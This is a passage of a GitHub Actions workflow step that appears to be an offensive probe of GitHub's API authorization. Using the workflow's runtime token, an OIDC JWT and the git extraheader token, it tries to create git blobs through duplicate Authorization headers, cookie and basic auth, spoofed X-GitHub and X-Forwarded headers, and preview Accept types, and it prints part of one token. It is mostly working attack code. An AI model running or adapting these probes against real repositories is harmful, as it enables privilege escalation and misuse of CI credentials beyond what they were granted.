      - name: 9 Multi-Token Cross-Auth Chain
        run: |
          set +e
          echo "=== MULTI-TOKEN CROSS-AUTH CHAIN ==="
          echo "v7: ghs_ runtime, extraheader ghs_, OIDC JWTs — try combining them"
          echo ""
          echo "--- Dual auth header attacks ---"
          echo "I01 dual Authorization headers (runtime + OIDC):"
          JWT=""
          if [ -n "$OIDC_URL" ]; then
            JWT=$(curl -sf -H "Authorization: bearer $OIDC_TOK" \
              "${OIDC_URL}&audience=api.github.com" 2>/dev/null | jq -r '.value // empty' 2>/dev/null)
          fi
          # Some reverse proxies take the LAST auth header
          if [ -n "$JWT" ]; then
            R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: token $GH_TOKEN" \
              -H "Authorization: Bearer $JWT" \
              -H "Content-Type: application/json" \
              "$UP/git/blobs" -d '{"content":"v8-dual","encoding":"utf-8"}' 2>/dev/null)
            echo "dual-auth (runtime+oidc) blob = HTTP_$R"
            R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: Bearer $JWT" \
              -H "Authorization: token $GH_TOKEN" \
              -H "Content-Type: application/json" \
              "$UP/git/blobs" -d '{"content":"v8-dual","encoding":"utf-8"}' 2>/dev/null)
            echo "dual-auth (oidc+runtime) blob = HTTP_$R"
          fi
          echo ""
          echo "--- Cookie-based auth attempt ---"
          echo "I02 try cookie auth:"
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -b "user_session=$GH_TOKEN" \
            "$UP/git/blobs" -d '{"content":"v8-cookie","encoding":"utf-8"}' 2>/dev/null)
          echo "cookie auth blob = HTTP_$R"
          echo ""
          echo "--- Basic auth with token as password ---"
          echo "I03 basic auth:"
          R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -u "x-access-token:$GH_TOKEN" \
            -H "Content-Type: application/json" \
            "$UP/git/blobs" -d '{"content":"v8-basic","encoding":"utf-8"}' 2>/dev/null)
          echo "basic auth blob = HTTP_$R"
          echo ""
          if [ -n "$GIT_EXTRA" ] && [ "$GIT_EXTRA" != "$GH_TOKEN" ]; then
            echo "I04 extraheader token (different from GH_TOKEN):"
            echo "extra prefix=$(echo $GIT_EXTRA | head -c 10)"
            R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: token $GIT_EXTRA" \
              -H "Content-Type: application/json" \
              "$UP/git/blobs" -d '{"content":"v8-extra","encoding":"utf-8"}' 2>/dev/null)
            echo "extraheader token blob = HTTP_$R"
          else
            echo "I04 extraheader token same as GH_TOKEN, skipping"
          fi
          echo ""
          echo "--- X-GitHub-* header injection ---"
          echo "I05 header injections:"
          for HDR in \
            "X-GitHub-Token: $GH_TOKEN" \
            "X-GitHub-Delivery: force-accept" \
            "X-GitHub-Hook-ID: 1" \
            "X-GitHub-Event: push" \
            "X-GitHub-Hook-Installation-Target-Type: repository" \
            "X-Hub-Signature: sha256=fake" \
            "X-Forwarded-For: 127.0.0.1" \
            "X-Real-IP: 127.0.0.1" \
            "X-Forwarded-Host: api.github.com" \
            "X-Original-URL: /repos/twrps/PoC-RACE2/git/blobs" \
            "X-GitHub-Enterprise-Instance: github.com" \
            "X-GitHub-SSO: authenticated"; do
            HDR_NAME=$(echo "$HDR" | cut -d: -f1)
            R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: token $GH_TOKEN" \
              -H "Content-Type: application/json" \
              -H "$HDR" \
              "$UP/git/blobs" -d '{"content":"v8-hdr","encoding":"utf-8"}' 2>/dev/null)
            { [ "$R" != "403" ] && echo "  $HDR_NAME = HTTP_$R ***ANOMALY***"; } || true
          done
          echo ""
          echo "--- Accept header manipulation ---"
          echo "I06 accept header variations:"
          for ACCEPT in \
            "application/vnd.github.v3+json" \
            "application/vnd.github.v4+json" \
            "application/vnd.github.mercy-preview+json" \
            "application/vnd.github.nebula-preview+json" \
            "application/vnd.github.flash-preview+json" \
            "application/vnd.github.shadow-cat-preview+json" \
            "application/vnd.github.doctor-strange-preview+json" \
            "application/json" \
            "text/plain"; do
            R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: token $GH_TOKEN" \
              -H "Content-Type: application/json" \
              -H "Accept: $ACCEPT" \
              "$UP/git/blobs" -d '{"content":"v8-accept","encoding":"utf-8"}' 2>/dev/null)
            { [ "$R" != "403" ] && echo "  accept=$ACCEPT = HTTP_$R ***ANOMALY***"; } || true
          done
          true

